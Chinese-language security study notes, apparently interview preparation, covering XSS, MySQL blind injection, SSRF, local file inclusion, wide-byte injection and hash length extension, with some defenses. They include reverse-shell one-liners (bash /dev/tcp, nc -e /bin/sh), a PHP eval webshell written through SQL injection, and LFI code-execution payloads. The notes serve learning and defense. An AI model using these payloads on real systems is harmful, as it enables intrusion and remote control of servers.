### dom xss
	注入方式是本地客户端的js处理用户输入时，发生的xss
	主要有三种方式：
	1) document.getElementBtId('a').innerHTML = $var$
		$var$ = alert(1)不会执行，需要使用 <img src="" onerror=alert(1);>
	2) document.location = $var$
		可以使用js伪协议，$var$ = javascript:alert(1)
	3) eval($var$)
		$var$ = alert(1)，其他执行库也可以，setInterval(),setTimeout()

### 富文本XSS防御
	1) 前后端穷举有限标签和属性，进行白名单过滤。后端不能直接信任前端数据，需要基于白名单再次过滤。推荐django-xss-cleaner
	2) 后端转义存储，前端展示时，进行黑名单过滤。推荐使用 js-xss。
	
### xss 触发事件
	onclick, onerror, onload, onmouseenter, onmouseleave, onscroll ...

### mysql 事件盲注延迟方法
	1) sleep(5)
	2) benchmark(10000,sha(1))  基准测试，可以观察系统在不同压力下的行为。
	3) 笛卡尔积，一般耗费资源
```
	SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.tables C;
```
	4) get_lock(name, timeout)，需要开两个session
```
SESSION A

mysql> select get_lock('test',1);

1 row in set (0.00 sec)
SESSION B

mysql> select get_lock('test',5);

1 row in set (5.00 sec)
```
	5) rpad或repeat构造长字符串，使用RLIKE匹配，使计算量增大，原理类似笛卡尔积
```
select rpad('a',4999999,'a') RLIKE concat(repeat('(a.*)+',30),'b');
```

### linux 反弹shell
	bash -i >& /dev/tcp/${ip}/${port} 0>&1
	nc -c(-e) /bin/sh ${ip} ${port}
[](http://www.lovebear.top/2018/09/16/Linux_shell/)
	
### sqlmap --os-shell条件
	1) 网站是root权限
	2) 知道网站的绝对路径
		a. phpinfo
		b. select load_file('/etc/apache2/sites-available/default')
		   select load_file(char(47))  char(47)-->'/', load_file == cat，可以列出目录
			P.S. secure-file-priv需关闭，限制into outfile，load_file
		c. show variables like 'datadir'; 获取mysql安装目录
		d. 报错
			user[]=1&passwd[]=1,  等, 后端代码处理不了数组，进行报错
	3) gpc为off，php主动转义功能关闭
	
### sql注入写shell方式
	1) select '<?php @eval($_POST[cmd]);?>' into outfile '/home/shell.php'
	2) sqlmap --os-shell
	
### mysql爆表
	1) information_schema.tables
	2) 5.6以上：
		select group_concat(table_name) from mysql.innodb_table_stats where database_name=schema()
		select group_concat(table_name) from mysql.innodb_index_stats where database_name=schema()

### mysql字符串截取函数
	1) substring(str, pos, length), pos从1开始
	2) substr(str, pos, length)
	3) mid(str, pos, length)
	4) left(str, length)

### arp欺骗及防御
	攻击者A，受害者B
	A 在网络中发送大量的伪造的ARP应答，当网络中的主机询问B的mac时，收到A伪造的
	Arp应答包，并写入ARP缓存，本要与B通信的流量全被A所劫持。
	防御：DHCP保留网上各计算机的MAC地址，在伪造的ARP数据包发出时即可侦测到。

### ssrf
	1) 概念：
	SSRF(服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。
	2) 形成原因：
	大都是由于服务端提供了从其他服务器应用获取数据的功能，且没有对目标地址做过滤
	与限制。比如从指定URL地址获取网页文本内容，加载指定地址的图片，文档，等等。
	3) 利用：
	内网端口服务探测，敏感文件读取，等等。
		a. file:///etc/passwd 读文件
		b. dict://victim:80 扫开放端口
		   dict://victim:6379/info 执行redis命令
		c. gopher://victim:6379/${gopher_shell_data}
			socat截获转发bash脚本，获取到tcp的data，转换为gopher格式的${gopher_shell_data}
	4) 寻找漏洞：
	分享：通过URL地址分享网页内容，url形式加载图片，未公开的api，转码、翻译页面
	5) 防御：
		a. 只允许http(s)协议
		b. 设置白名单
		c. 过滤返回信息
		d. 限制请求的端口(不让请求6379等)
	

### 本地文件包含
	1) php函数：include(), require(), include_once(), require_once()
		包含失败include警告，require错误
		php文件包含机制有个特性：哪怕被包含的文件是个txt文件，它也会被包含文件
		所在的服务器当作脚本去执行
	2) 利用方式：
		a. 基本LFI，直接读取出文件内容，如/etc/passwd。
			有些网站为了防止目录穿越，过滤了 ../ ,这时可以使用绝对路径进行文件读取
		b. %00截断（php5.3以下，不能转义magic_quotes_gpc设置为off）
			有些网站为了防御，会为文件加后缀，可以使用%00进行截断
		c. php://filter/read=convert.base64encode/resource=/etc/passwd
			安全级别高，且无法查看内容
		d. lan=php://input&cmd=ls	postdata="<?php system($_GET['cmd']);?>"
			使用php://input函数，通过执行注入PHP代码来利用LFI漏洞
		e. ../../../Proc/self/environ
			User-Agent的信息会被写入/proc/self/environ，可以将小马写入这个文件，
			然后本地包含/proc/self/environ，执行php命令

### 宽字节注入
	1) 形成原因：
	配置mysql连接的时候 set character_set_client=gbk，%27(')被转义后变成%5c%27(\'),
	查询mysql前，被gbk编码翻译，输入的%df与%5c被翻译成两字节的汉字，从而“吃”了%5c
	2) 防御：
	set character_set_client=binary 或 utf8
	3) 其他：
	多字节编码多可以导致宽字节注入，但需要能翻译低字节为%5c的，big5也可以，utf8不可以
### 哈希长度扩展攻击
	1) Merkle–Damgård算法（md5，sha1）
![](https://github.com/cckuailong/Interview/blob/master/images/hash.png)

	每512字节分成一块，最后一块使用1000...进行填充，最后64字节存放原始字符串长度。
	2) 哈希长度扩展攻击
	由于后一块的输入是前一块的输出+message，所以只需要知道前一块的message长度和前一块的
	hash输出，即可在不知道pre_msg具体内容的情况下计算出这样的hash值，
	pre_msg+'1000...'+len(pre_msg)+'任意字符串'
### python2,3区别
	1) 编码 python2默认ascii，python3默认unicode
	2) import python2相对路径，python3绝对路径
	3) python3缩进更严格，python2 1tab == 8space
	4) python3统一使用print()函数，异常处理语句也放生变化，等等
	5) python3中 '/' 为真除法
	
### HMAC
	1) 计算方式：
		HMAC(K,M)=H(K⊕opad|H(K⊕ipad|M))
		K: 秘钥
		M: 消息
		B: 处理块大小，sha1和sha256为64，sha384和sha512为128
		opad: 0x5c重复B次
		ipad: 0x36重复B次
	2) 用途：
		用于身份验证，C-->S 发送密码HMAC后的消息进行验证
	3) 安全性：
		防御彩虹表，拿到散列后信息，由于没有K，无法获得发送的原始密码。
		但是不能防止重放攻击。
	4) CMAC: 分组哈希，也使用K，每个组H(K,M[i])后异或下一组的M[i+1],作为输入